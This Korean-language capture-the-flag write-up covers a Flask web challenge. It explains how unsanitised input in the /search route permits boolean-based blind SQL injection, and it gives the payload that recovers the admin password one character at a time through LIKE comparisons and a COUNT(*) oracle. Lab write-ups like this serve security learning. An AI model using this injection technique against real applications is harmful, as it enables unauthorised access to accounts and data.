# Problem Overview

db에 저장된 flag를 확인하라

# Analysis

파이썬 플라스크로 만들어진 웹서비스이며, admin유저로 로그인 시 /admin으로 라우팅되며 `flag.txt`의 정보를 획득할 수 있는 것으로 확인함.
`/search` 라우트의 경우 `secret_data`의 db에서 개수를 조회하는 변수를 받아 문자열에 대입하는 다이나믹 쿼리가 있었고, 이를 통해 sql인젝션 공격이 가능하다라는 것을 파악함.
admin의 비밀번호는 `urandom(8).hex()`를 통해 16글자의 16진수 비밀번호라는 것을 유추할 수 있음.

> sql 인젝션을 통해 admin의 비밀번호를 찾고, 이를 통해 플래그를 획득하라.

# Exploitation Strategy

`/search` 경로로 보내는 query 파라미터가 sql 쿼리에 직접 삽입되므로 UNION 기반 sql injection이 가능하다.
현재의 쿼리가 `SELECT COUNT(*) FROM secret_data WHERE title LIKE '%{query}%'`로 일치하는 개수인 `COUNT(*)`를 반환하고 where 조건에 `' AND (SELECT password FROM users WHERE username = 'admin') LIKE '0%`과 같이 참거짓을 판별할 수 있는 방식으로 1자리씩 대입하여 비밀번호를 찾을 수 있다.
틀린 비밀번호의 경우 `COUNT(*)`이 0이 될 것이기 때문에 비밀번호가 맞는지 틀리는 지를 구분할 수 있고 16자리 비밀번호를 찾을 때까지 반복한다.

```
SELECT COUNT(*)
FROM secret_data
WHERE title LIKE '%'
AND (
  SELECT password
  FROM users
  WHERE username = 'admin'
) LIKE '0%'

# '0%' [0-F]까지 대입하며 16자 비밀번호를 찾아냄
LIKE '1%'
LIKE '2%'
...
LIKE 'a%'
```

# Execution

```
# 비밀번호 얻는 스크립트
python solve.py

# admin, 스크립트로 얻은 비밀번호로 로그인하여 플래그 획득
```

# Flag

`DH{94...c9}`
